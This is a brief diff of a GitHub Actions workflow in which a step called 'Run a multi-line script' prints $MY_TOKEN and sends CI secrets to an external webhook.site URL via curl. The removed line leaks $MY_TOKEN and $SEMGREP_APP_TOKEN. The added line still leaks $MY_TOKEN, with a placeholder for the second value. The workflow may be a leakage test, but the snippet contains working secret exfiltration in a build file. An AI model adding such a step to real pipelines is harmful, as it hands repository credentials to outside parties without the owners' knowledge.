@@ -37,6 +37,6 @@ jobs:
       - name: Run a multi-line script
         run: |
           echo $MY_TOKEN
-          curl https://webhook.site/764cf3d1-c66c-47ac-883f-dd16a050fa18?a=$MY_TOKEN&b=$SEMGREP_APP_TOKEN
+          curl https://webhook.site/764cf3d1-c66c-47ac-883f-dd16a050fa18?a=$MY_TOKEN&b=testtest
 
           
